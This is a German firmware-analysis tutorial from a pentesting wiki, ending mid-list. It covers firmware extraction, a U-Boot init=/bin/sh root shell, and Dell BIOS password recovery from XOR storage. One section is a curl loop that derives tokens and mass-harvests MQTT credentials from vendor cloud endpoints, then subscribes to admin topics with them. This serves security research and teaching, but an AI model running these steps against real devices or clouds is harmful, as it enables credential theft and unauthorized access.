# Firmware-Analyse

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Einleitung**

### Zugehörige Ressourcen

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware ist essenzielle Software, die den korrekten Betrieb von Geräten ermöglicht, indem sie die Kommunikation zwischen den Hardwarekomponenten und der Software verwaltet und erleichtert, mit der Benutzer interagieren. Sie wird in einem permanenten Speicher abgelegt, damit das Gerät vom Einschalten an auf wichtige Anweisungen zugreifen kann und anschließend das Betriebssystem gestartet wird. Die Untersuchung und mögliche Modifizierung der Firmware ist ein wichtiger Schritt beim Aufspüren von Sicherheitslücken.<sup>[[2]](#references)[[3]](#references)</sup>

## **Informationsbeschaffung**

Die **Informationsbeschaffung** ist ein wichtiger erster Schritt, um den Aufbau eines Geräts und die darin verwendeten Technologien zu verstehen. Dabei werden unter anderem folgende Daten gesammelt:

- CPU-Architektur und darauf ausgeführtes Betriebssystem
- Details zum Bootloader
- Hardware-Layout und Datenblätter
- Metriken zur Codebasis und Speicherorte des Quellcodes
- Externe Bibliotheken und Lizenztypen
- Update-Verlauf und regulatorische Zertifizierungen
- Architektur- und Ablaufdiagramme
- Sicherheitsbewertungen und identifizierte Schwachstellen

Zu diesem Zweck sind **Open-Source-Intelligence (OSINT)**-Tools unverzichtbar. Dasselbe gilt für die Analyse verfügbarer Open-Source-Softwarekomponenten durch manuelle und automatisierte Prüfverfahren. Tools wie [Coverity Scan](https://scan.coverity.com) und [Semmle’s LGTM](https://lgtm.com/#explore) bieten kostenlose statische Analysen, mit denen potenzielle Probleme gefunden werden können.

## **Firmware beschaffen**

Firmware kann auf verschiedene Weise beschafft werden, wobei jede Methode unterschiedlich komplex ist:

- **Direkt** von der Quelle (Entwicklern, Herstellern)
- Durch **Builden** anhand bereitgestellter Anweisungen
- Durch **Herunterladen** von offiziellen Support-Websites
- Mithilfe von **Google-dork**-Suchanfragen, um gehostete Firmware-Dateien zu finden
- Durch direkten Zugriff auf **Cloud-Speicher**, etwa mit Tools wie [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Durch Abfangen von **Updates** mithilfe von Man-in-the-Middle-Techniken
- Durch **Extrahieren** vom Gerät über Verbindungen wie **UART**, **JTAG** oder **PICit**
- Durch **Mitscheiden** von Update-Anfragen in der Gerätekommunikation
- Durch Ermitteln und Verwenden von **fest codierten Update-Endpunkten**
- Durch **Dumps** aus dem Bootloader oder über das Netzwerk
- Wenn nichts anderes hilft, durch **Ausbauen und Auslesen** des Speicherchips mit geeigneten Hardware-Tools

### UART-only-Protokolle: Eine Root-Shell über die U-Boot-Umgebungsvariablen im Flash erzwingen

Wenn UART RX ignoriert wird (nur Protokolle), kannst du trotzdem eine Init-Shell erzwingen, indem du **den U-Boot-Umgebungsblock offline bearbeitest**:<sup>[[6]](#references)</sup>

1. SPI-Flash mit einem SOIC-8-Clip und einem Programmer auslesen (3,3 V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Finde die U-Boot-env-Partition, bearbeite `bootargs`, sodass `init=/bin/sh` enthalten ist, und **berechne die U-Boot-env-CRC32 für den Blob neu**.
3. Schreibe nur die env-Partition neu und starte das Gerät neu; auf der UART sollte eine Shell erscheinen.

Das ist bei Embedded-Geräten nützlich, bei denen die Bootloader-Shell deaktiviert ist, aber über externen Flash-Zugriff auf die env-Partition geschrieben werden kann.

## Firmware analysieren

Nachdem du jetzt **die Firmware hast**, musst du Informationen darüber extrahieren, um zu wissen, wie du damit umgehen sollst. Dafür kannst du verschiedene Tools verwenden:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Wenn du mit diesen Tools nicht viel findest, prüfe die **Entropie** des Images mit `binwalk -E <bin>`: Bei niedriger Entropie ist es wahrscheinlich nicht verschlüsselt. Bei hoher Entropie ist es wahrscheinlich verschlüsselt (oder auf irgendeine Weise komprimiert).

Außerdem kannst du diese Tools verwenden, um **in der Firmware eingebettete Dateien** zu extrahieren:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Oder [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)), um die Datei zu untersuchen.

### Differentielle Flash-Analyse und wiederherstellbare XOR-Geheimnisspeicher

Wenn für eine Firmware-Einstellung kein Speicherformat dokumentiert ist, erstelle zunächst mehrere übereinstimmende Flash-Dumps, ändere **genau eine** Einstellung, lies den gesamten Chip erneut aus und vergleiche die Offsets. Durch Wiederholung des Experiments mit kontrollierten Werten lässt sich die Einstellung von Zählern und Schreibmetadaten unterscheiden. Änderungen an neuen Offsets statt an Ort und Stelle deuten auf einen Append-only- oder log-strukturierten Speicher hin. Bewahre gelöschte bzw. als gelöscht markierte Einträge auf, da ihre Nutzdaten möglicherweise wiederhergestellt werden können.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

Nachdem du die Region gefunden hast, extrahiere die Firmware-Module mit Tools wie `binwalk` und analysiere den Writer/Validator in Ghidra per Reverse Engineering. Bestätige Feldgrenzen, Padding, Schlüsselindizierung und Schlüsselableitung im Code, statt das Schema nur aus Chiffretextmustern abzuleiten.<sup>[[10]](#references)</sup>

#### Schlüssel aus verschlüsseltem Null-Padding wiederherstellen

Wie unter [XOR-based encryption](../../crypto/symmetric/#xor-based-encryption) beschrieben, enthüllt bekannter Klartext an denselben Offsets Bytes des Keystreams. Ein Feld mit fester Größe ist besonders anfällig, wenn sich sein Null-Padding über alle Indizes eines sich wiederholenden XOR-Schlüssels erstreckt: Das verschlüsselte Padding enthüllt diese Schlüsselbytes direkt, da `0x00 XOR key_byte = key_byte` gilt. Wenn alle Schlüsselindizes abgedeckt sind, rekonstruiere den Schlüssel aus dem Ende des Chiffretexts und entschlüssele die enthaltenen Bytes.<sup>[[10]](#references)</sup>

Dells anfälliges DVAR-Format für BIOS-Passwörter ist ein konkretes Beispiel: Byte `0` eines 32-Byte-Felds liegt im Klartext vor, während für die Bytes `1..31` ein sich wiederholender 20-Byte-Schlüssel verwendet wird.<sup>[[10]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Bei einer Passwortlänge `L` waren die Positionen `L..31` vor dem XOR null. Wenn `L <= 12`, decken diese Positionen jeden Schlüsselindex ab, sodass der vollständige Schlüssel und das Passwort ohne Brute Force wiederhergestellt werden:<sup>[[10]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Schlüssel aus historischen Datensätzen gewinnen

Analysieren Sie nicht jeden Datensatz einzeln. Der DVAR-Schlüssel wird ungefähr wie folgt abgeleitet: `modified_md5(device_seed || variable_GUID || password[0])`: Der Geräte-Seed und die GUID sind fest, und die einzige passwortabhängige Eingabe ist das erste Klartext-Byte. Dadurch gibt es pro Gerät höchstens 256 Schlüssel, und Datensätze, die mit demselben Byte beginnen, verwenden denselben Schlüssel. Gruppieren Sie aktive und gelöschte Datensätze nach diesem Byte; ein kurzer historischer Datensatz kann den vollständigen Schlüssel durch Padding preisgeben und damit einen aktuellen, längeren Datensatz entschlüsseln, dessen eigenes Padding nicht ausreicht. Ein Passwortwechsel kann daher das Risiko erhöhen, wenn alte Ciphertexte tombstoned statt gelöscht werden.<sup>[[10]](#references)</sup>

Das Tool [`dellpwn`](https://github.com/R3n5k1/dellpwn) findet DVAR, validiert mögliche Datensätze, stellt Passwörter wieder her und kann gespeicherte Rohdaten-/Schlüsselbytes anzeigen. Erstellen Sie es aus einem Checkout und scannen Sie ein verifiziertes Flash-Image wie folgt:<sup>[[11]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

Bei benutzerdefinierten Parsern lassen sich False Positives mithilfe der Datensatzstruktur, Einschränkungen für druckbare Zeichen, Prüfungen auf Nullauffüllung, Schlüsselentropie und Konsistenz beim Umlauf des Schlüssels verwerfen. Wenn wiederholte Dumps pro Schreibvorgang vereinzelte Bit-Flips zeigen, liste die beobachteten Masken auf und ordne mögliche Korrekturen anhand dieser Einschränkungen. Gib jedoch mehrdeutige Zeichen an, statt heuristische Ergebnisse als exakte Wiederherstellung darzustellen.<sup>[[10]](#references)</sup>

Passwortverifizierer sollten statt umkehrbarem Chiffretext einen gesalzenen, iterierten Einweg-Hash speichern; bei logstrukturierten Speichern sollten veraltete geheime Daten sicher entfernt werden.<sup>[[10]](#references)</sup>

### Das Dateisystem abrufen

Mit den zuvor kommentierten Tools wie `binwalk -ev <bin>` solltest du **das Dateisystem extrahieren** können.\
Binwalk extrahiert es normalerweise in einen **Ordner, der nach dem Dateisystemtyp benannt ist**. Üblicherweise handelt es sich dabei um einen der folgenden Typen: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Manuelle Extraktion des Dateisystems

Manchmal enthält binwalk **das Magic Byte des Dateisystems nicht in seinen Signaturen**. Verwende in diesen Fällen binwalk, um **den Offset des Dateisystems zu finden und das komprimierte Dateisystem** aus der Binärdatei herauszuschneiden, und **extrahiere** das Dateisystem anhand der folgenden Schritte **manuell**, je nach Typ.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Führen Sie den folgenden **dd-Befehl** aus, um das Squashfs-Dateisystem zu extrahieren.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Alternativ kann auch der folgende Befehl ausgeführt werden.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Für squashfs (wie im obigen Beispiel verwendet)

`$ unsquashfs dir.squashfs`

Die Dateien befinden sich anschließend im Verzeichnis "`squashfs-root`".

- CPIO-Archivdateien

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Für jffs2-Dateisysteme

`$ jefferson rootfsfile.jffs2`

- Für ubifs-Dateisysteme mit NAND-Flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Firmware analysieren

Sobald die Firmware beschafft wurde, ist es wichtig, sie zu zerlegen, um ihre Struktur und potenzielle Schwachstellen zu verstehen. Bei diesem Prozess kommen verschiedene Tools zum Einsatz, mit denen die Firmware analysiert und wertvolle Daten aus dem Firmware-Image extrahiert werden.

### Werkzeuge zur ersten Analyse

Für die erste Untersuchung der Binärdatei (hier als `<bin>` bezeichnet) werden verschiedene Befehle bereitgestellt. Sie helfen dabei, Dateitypen zu identifizieren, Zeichenketten zu extrahieren, Binärdaten zu analysieren und Informationen zu Partitionen und Dateisystemen zu gewinnen:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Um den Verschlüsselungsstatus des Abbilds zu beurteilen, wird die **Entropie** mit `binwalk -E <bin>` geprüft. Eine niedrige Entropie deutet auf fehlende Verschlüsselung hin, während eine hohe Entropie auf mögliche Verschlüsselung oder Komprimierung schließen lässt.

Zum Extrahieren **eingebetteter Dateien** werden Tools und Ressourcen wie die Dokumentation **file-data-carving-recovery-tools** und **binvis.io** zur Dateiprüfung empfohlen.

### Extrahieren des Dateisystems

Mit `binwalk -ev <bin>` lässt sich das Dateisystem normalerweise extrahieren, häufig in ein Verzeichnis, das nach dem Dateisystemtyp benannt ist (z. B. squashfs, ubifs). Wenn **binwalk** den Dateisystemtyp jedoch aufgrund fehlender Magic Bytes nicht erkennt, ist eine manuelle Extraktion erforderlich. Dazu wird mit `binwalk` der Offset des Dateisystems ermittelt. Anschließend lässt sich das Dateisystem mit dem Befehl `dd` ausschneiden:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Anschließend werden abhängig vom Dateisystemtyp (z. B. squashfs, cpio, jffs2, ubifs) verschiedene Befehle verwendet, um die Inhalte manuell zu extrahieren.

### Dateisystemanalyse

Nachdem das Dateisystem extrahiert wurde, beginnt die Suche nach Sicherheitslücken. Dabei wird auf unsichere Netzwerk-Daemons, fest codierte Zugangsdaten, API-Endpunkte, Funktionen von Update-Servern, nicht kompilierten Code, Startskripte und kompilierte Binärdateien für die Offline-Analyse geachtet.

Zu den **wichtigen Speicherorten** und **Elementen**, die untersucht werden sollten, gehören:

- **etc/shadow** und **etc/passwd** für Benutzerzugangsdaten
- SSL-Zertifikate und Schlüssel in **etc/ssl**
- Konfigurations- und Skriptdateien auf potenzielle Schwachstellen
- Eingebettete Binärdateien zur weiteren Analyse
- Gängige Webserver und Binärdateien von IoT-Geräten

Mehrere Tools helfen dabei, sensible Informationen und Schwachstellen im Dateisystem aufzuspüren:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) und [**Firmwalker**](https://github.com/craigz28/firmwalker) zum Suchen nach sensiblen Informationen
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) für umfassende Firmware-Analyse
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) und [**EMBA**](https://github.com/e-m-b-a/emba) für statische und dynamische Analyse

### Sicherheitsprüfungen kompilierter Binärdateien

Sowohl im Dateisystem gefundener Quellcode als auch kompilierte Binärdateien müssen auf Schwachstellen untersucht werden. Tools wie **checksec.sh** für Unix-Binärdateien und **PESecurity** für Windows-Binärdateien helfen dabei, ungeschützte Binärdateien zu identifizieren, die ausgenutzt werden könnten.

## Cloud-Konfiguration und MQTT-Zugangsdaten über abgeleitete URL-Tokens abgreifen

Viele IoT-Hubs rufen ihre gerätespezifische Konfiguration von einem Cloud-Endpunkt ab, der etwa so aussieht:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Bei der Firmware-Analyse lässt sich möglicherweise feststellen, dass `<token>` lokal aus der Geräte-ID und einem fest codierten geheimen Schlüssel abgeleitet wird, zum Beispiel:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Dieses Design ermöglicht es jeder Person, die eine deviceId und den STATIC_KEY kennt, die URL zu rekonstruieren und die Cloud-Konfiguration abzurufen. Dabei werden häufig MQTT-Zugangsdaten im Klartext und Topic-Präfixe offengelegt.

Praktischer Ablauf:

1) deviceId aus UART-Bootprotokollen extrahieren

- Einen 3,3-V-UART-Adapter (TX/RX/GND) anschließen und die Protokolle aufzeichnen:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Suchen Sie nach Zeilen, die das URL-Muster der Cloud-Konfiguration und die Broker-Adresse ausgeben, zum Beispiel:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) STATIC_KEY und Token-Algorithmus aus der Firmware ermitteln

- Lade die Binärdateien in Ghidra/radare2 und suche nach dem Konfigurationspfad ("/pf/") oder der Verwendung von MD5.
- Bestätige den Algorithmus (z. B. MD5(deviceId||STATIC_KEY)).
- Berechne den Token in Bash und wandle den Digest in Großbuchstaben um:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Cloud-Konfiguration und MQTT-Zugangsdaten sammeln

- URL zusammensetzen und JSON mit curl abrufen; mit jq parsen, um Secrets zu extrahieren:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Missbrauchen Sie unverschlüsseltes MQTT und schwache Topic-ACLs (falls vorhanden)

- Verwenden Sie wiederhergestellte Zugangsdaten, um Wartungs-Topics zu abonnieren und nach sensiblen Ereignissen zu suchen:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Vorhersehbare Device IDs auflisten (in großem Umfang und mit Autorisierung)

- Viele Ökosysteme betten Vendor-OUI-/Produkt-/Typ-Bytes ein, gefolgt von einem sequenziellen Suffix.
- Du kannst Kandidaten-IDs iterieren, Tokens ableiten und Configs programmatisch abrufen:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Hinweise
- Hole immer eine ausdrückliche Genehmigung ein, bevor du mit einer Mass Enumeration beginnst.
- Bevorzuge nach Möglichkeit Emulation oder statische Analyse, um Secrets wiederherzustellen, ohne die Zielhardware zu verändern.


Die Emulation von Firmware ermöglicht eine **dynamische Analyse** des Betriebs eines Geräts oder eines einzelnen Programms. Dabei können Herausforderungen aufgrund von Hardware- oder Architekturabhängigkeiten auftreten. Die Übertragung des Root-Dateisystems oder bestimmter Binaries auf ein Gerät mit passender Architektur und Endianness, etwa einen Raspberry Pi, oder auf eine vorgefertigte virtuelle Maschine kann jedoch weitere Tests erleichtern.

### Einzelne Binaries emulieren

Bei der Untersuchung einzelner Programme ist es entscheidend, die Endianness und CPU-Architektur des Programms zu bestimmen.

#### Beispiel mit MIPS-Architektur

Um ein Binary mit MIPS-Architektur zu emulieren, kann folgender Befehl verwendet werden:

```bash
file ./squashfs-root/bin/busybox
```

Und um die erforderlichen Emulationswerkzeuge zu installieren:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Für MIPS (Big-Endian) wird `qemu-mips` verwendet; für Little-Endian-Binärdateien ist `qemu-mipsel` die passende Wahl.

#### Emulation der ARM-Architektur

Bei ARM-Binärdateien läuft der Prozess ähnlich ab; zur Emulation wird der Emulator `qemu-arm` verwendet.

### Vollständige Systememulation

Tools wie [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) und andere ermöglichen die vollständige Firmware-Emulation, automatisieren den Prozess und unterstützen die dynamische Analyse.

### Rekonstruktion geteilter und verifizierter Root-Dateisysteme für die Emulation

Wenn ein SquashFS-Superblock lesbar ist, aber die Offsets der Inodes, Verzeichnisse oder Fragmenttabellen unmöglich erscheinen, sollte `unsquashfs` nicht sofort gepatcht werden. Analysiere stattdessen das frühe Boot-Binary rückwärts und reproduziere den Blockgerätegraphen, den es erstellt: Eingebettete Systeme können zwar eine nominelle Root-Partition bereitstellen, das tatsächliche Dateisystem aber mit einem `dm-linear`-Mapping erzeugen, das Sektoren aus einer anderen Partition anhängt. Prüfungen, die nur den Superblock berücksichtigen, können erfolgreich sein, obwohl alle nachfolgenden Metadatenblöcke verschoben sind.<sup>[[9]](#references)</sup>

Erhalte die Arithmetik der Firmware exakt. Ermittle insbesondere, ob Längen in Bytes, 512-Byte-Sektoren oder 4-KiB-Seiten angegeben sind; bilde Verschiebungen und Abschneidungen in ihrer ursprünglichen Reihenfolge nach; und berücksichtige vom Bank-Layout abhängige Endbereiche bei A/B-Layouts. Zum Beispiel schneidet `(partition_bytes >> 12) << 3` zunächst auf eine 4-KiB-Grenze ab und gibt das Ergebnis erst danach in 512-Byte-Sektoren an. Wird dies durch `partition_bytes // 512` ersetzt, kann sich der angehängte Bereich um einige Kilobytes verschieben und alle nachgelagerten SquashFS-Tabellen beschädigen.<sup>[[9]](#references)</sup>

Ein nützlicher Validierungsablauf ist:<sup>[[9]](#references)</sup>

1. Ermittle aus dem Verifier-/Init-Binary für jedes `dm-linear`-Segment das Quellgerät, den Startsektor und die Länge.
2. Füge die Bereiche zusammen oder mappe sie, ohne ihre Ausrichtungssemantik zu verändern.
3. Falls die Extraktion weiterhin fehlschlägt, durchsuche nur einen kleinen Bereich um die vorhergesagte Grenze und verlange mehrere aufeinanderfolgende gültige Metadatenstrukturen, statt allein einen plausiblen Superblock zu akzeptieren.
4. Führe ein unverändertes `unsquashfs` für das rekonstruierte Image aus. Das erfolgreiche Durchlaufen aller Verzeichnisse und Fragmente ist ein stärkerer Beleg als `unsquashfs -stat`.

#### Vom Analysten kontrollierter dm-verity-Ersatz

Wenn der Analyst den QEMU-Kernel, das initramfs und die virtuellen Datenträger kontrolliert, kann ein modifiziertes Root gebootet werden, indem PID 1 des Verifiers des Herstellers durch ein kleines statisch gelinktes Init ersetzt wird. Dies ist eine **Boot-Chain-Ersetzung im Labor** und kein Bruch von dm-verity, seiner RSA-Signatur, Secure Boot oder eines durch ein TPM versiegelten Schlüssels.<sup>[[9]](#references)</sup>

Das Ersatz-Init sollte die operativen Schritte des ursprünglichen Bootpfads nachbilden: `devtmpfs` mounten, `setsid()` aufrufen, `/dev/console` mit den Dateideskriptoren 0–2 verbinden, `/proc` und `/sys` mounten, auf das bereitgestellte Blockgerät warten, das bearbeitete Root schreibgeschützt mounten, die Pseudo-Dateisysteme des alten Roots aushängen, den neuen Mount auf `/` verschieben, `chroot` ausführen und das ursprüngliche `/sbin/init` der Firmware mit `execve()` starten. Wenn `/dev`, `/proc` und `/sys` **vor** `MS_MOVE` ausgehängt werden, wird vermieden, dass versehentlich Mountpoints des neuen Roots ausgehängt werden.<sup>[[9]](#references)</sup>

Halte den veränderbaren Gerätezustand vom modifizierten unveränderlichen Root getrennt. Ein qcow2-Overlay kann den LVM-Zustand des ursprünglichen Datenträgers erhalten, während ein zweiter schreibgeschützter VirtIO-Datenträger das bearbeitete SquashFS bereitstellt:<sup>[[9]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Offline-Debugging des Image-Zustands

Untersuche den persistenten Zustand außerhalb des Guest-Systems, wenn langsame Bootvorgänge, destruktive Startskripte oder unzuverlässige Konsolenprotokollierung die Fehlersuche erschweren. Binde niemals ein Overlay ein, das von einer laufenden VM verwendet wird; mache es mit `qemu-nbd` verfügbar, beschränke die LVM-Erkennung auf die vorgesehene NBD-Partition und deaktiviere die Volume Group, bevor du die Verbindung trennst.<sup>[[9]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Für eine reproduzierbare Fehlerisolierung sollten Zeitstempel tragende Markerdateien auf einem stabilen, beschreibbaren Volume abgelegt und offline überprüft werden; `/dev/kmsg`, FIFOs und flüchtige Konsolen können durch Rate-Limiting oder den vorzeitigen Prozessabbruch falsch-negative Ergebnisse liefern. Vergleiche außerdem die exakten Schnittstellen über die verschiedenen Ebenen hinweg, bevor du nicht zusammenhängenden Code änderst: `uname -r` mit `/lib/modules/`, ext4-Features auf dem Datenträger mit der Kernelkonfiguration und die Mesa-`libGL`-Generation mit der DRI-Treiber-ABI und den aus der PCI-ID abgeleiteten Treibernamen. Eine Komponente kann vorhanden sein und sogar erfolgreich per `dlopen()` geladen werden, aber dennoch unbrauchbar sein, weil ihr Consumer eine andere ABI erwartet.<sup>[[9]](#references)</sup>

## Dynamische Analyse in der Praxis

In dieser Phase wird für die Analyse entweder eine reale oder emulierte Geräteumgebung verwendet. Es ist entscheidend, Shell-Zugriff auf das Betriebssystem und das Dateisystem zu behalten. Die Emulation bildet Hardware-Interaktionen möglicherweise nicht perfekt nach, sodass gelegentlich ein Neustart der Emulation erforderlich ist. Bei der Analyse sollten das Dateisystem erneut untersucht, exponierte Webseiten und Netzwerkdienste ausgenutzt und Bootloader-Schwachstellen erkundet werden. Firmware-Integritätstests sind entscheidend, um potenzielle Backdoor-Schwachstellen zu identifizieren.

## Techniken zur Laufzeitanalyse

Bei der Laufzeitanalyse wird mit einem Prozess oder einer Binärdatei in ihrer Betriebsumgebung interagiert. Dazu werden Tools wie gdb-multiarch, Frida und Ghidra verwendet, um Breakpoints zu setzen und Schwachstellen durch Fuzzing und andere Techniken zu identifizieren.

Bei Embedded-Zielen ohne vollständigen Debugger **kopiere ein statisch gelinktes `gdbserver`** auf das Gerät und verbinde dich remote damit:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Zigbee-/Radio-Co-Prozessor-Nachrichten-Mapping

Bei IoT-Hubs ist der RF-Stack oft auf einen **Radio-MCU** und einen Linux-Userland-Prozess aufgeteilt. Ein nützlicher Workflow ist, den Pfad zu ermitteln:<sup>[[8]](#references)</sup>

1. **RF-Frame** über Funk
2. **Controller-seitiger Parser** auf dem Radio-MCU
3. **Serielles/UART-Text- oder TLV-Protokoll**, das an Linux weitergeleitet wird (zum Beispiel `/dev/tty*`)
4. **Application-Dispatcher** im Hauptdaemon
5. **Protokollspezifischer Handler / Zustandsautomat**

Diese Architektur bietet zwei Reverse-Engineering-Ziele statt nur einem. Wenn der Controller binäre Funk-Frames in ein Textprotokoll wie `Group,Command,arg1,arg2,...` umwandelt, ermittle:

- Die **Nachrichtengruppen** und Dispatch-Tabellen
- Welche Nachrichten vom **Netzwerk** und welche vom Controller selbst stammen können
- Die exakten **herstellerspezifischen Unterscheidungsfelder** (zum Beispiel Zigbee-`manufacturer_code` und benutzerdefinierte `cluster_command`)
- Welche Handler nur während **Commissioning**, Discovery oder Firmware-/Model-Download-Phasen erreichbar sind

Prüfe bei Zigbee insbesondere den Pairing-Datenverkehr und ob das Ziel noch den standardmäßigen **Link Key** `ZigBeeAlliance09` verwendet. Falls ja, kann das Mitschneiden des Commissioning-Datenverkehrs den **Network Key** offenlegen. Zigbee-3.0-Installationscodes verringern dieses Risiko. Halte daher fest, ob das getestete Gerät sie tatsächlich erzwingt.

### Herstellerspezifische Protokoll-Handler und durch FSM begrenzte Erreichbarkeit

Herstellerspezifische Zigbee-/ZCL-Befehle sind oft ein besseres Ziel als standardisierte Cluster, da sie **benutzerdefinierten Parsing-Code** und interne **FSMs** mit weniger praxiserprobter Validierung durchlaufen.<sup>[[8]](#references)</sup>

Praktischer Workflow:

- Reverse-engineere den Command-Dispatcher, bis du den **nur für den Hersteller vorgesehenen Handler** findest.
- Ermittle die Tabellen für **FSM-Zustand**, **Ereignis**, **Prüfung**, **Aktion** und **Folgezustand**.
- Finde **Übergangszustände**, die automatisch weitergeschaltet werden, sowie Retry-/Error-Zweige, die schließlich den vom Angreifer kontrollierten Zustand zurücksetzen oder freigeben.
- Prüfe, welche legitimen Protokollabläufe erforderlich sind, um den Daemon in den verwundbaren Zustand zu versetzen. Gehe nicht davon aus, dass der fehlerhafte Handler immer erreichbar ist.

Bei zeitkritischen Protokollen kann die Paketwiedergabe über ein Python-Framework zu langsam sein. Zuverlässiger ist es, ein legitimes Gerät auf echter Hardware (zum Beispiel einem **nRF52840**) mit einem herstellerspezifischen Stack zu emulieren, damit die korrekten **Endpunkte**, **Attribute** und das richtige Commissioning-Timing bereitgestellt werden.

### Fehlerklasse: fragmentierte Downloads in eingebetteten Daemons

Eine wiederkehrende Firmware-Fehlerklasse tritt bei **fragmentierten Blob-/Model-/Konfigurations-Downloads** auf:<sup>[[8]](#references)</sup>

1. Das **erste Fragment** (`offset == 0`) speichert `ctx->total_size` und weist mit `malloc(total_size)` Speicher zu.
2. Spätere Fragmente validieren nur die vom Angreifer kontrollierten **paketlokalen** Felder, etwa `packet_total_size >= offset + chunk_len`.
